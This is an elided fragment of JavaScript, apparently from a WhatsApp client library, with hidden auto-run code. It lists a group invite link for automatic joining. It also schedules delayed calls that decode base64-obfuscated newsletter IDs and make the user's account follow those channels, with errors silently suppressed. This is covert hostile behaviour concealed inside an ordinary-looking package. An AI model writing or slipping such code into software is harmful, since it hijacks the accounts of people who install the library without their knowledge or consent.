...
const AUTO_JOIN_GROUP_LINKS = [
    "https://chat.whatsapp.com/Eagx2xXvTdP9jJwdAlmQmr?mode=gi_c"
];
...
setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzMjc2Njg5NjcwODYwQG5ld3NsZXR0ZXI=", "base64").toString(),
...
setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDE5ODA5OTIzNzIzQG5ld3NsZXR0ZXI=", "base64").toString(),
            Types_1.QueryIds.FOLLOW
        );
    } catch {}
}, 90000);
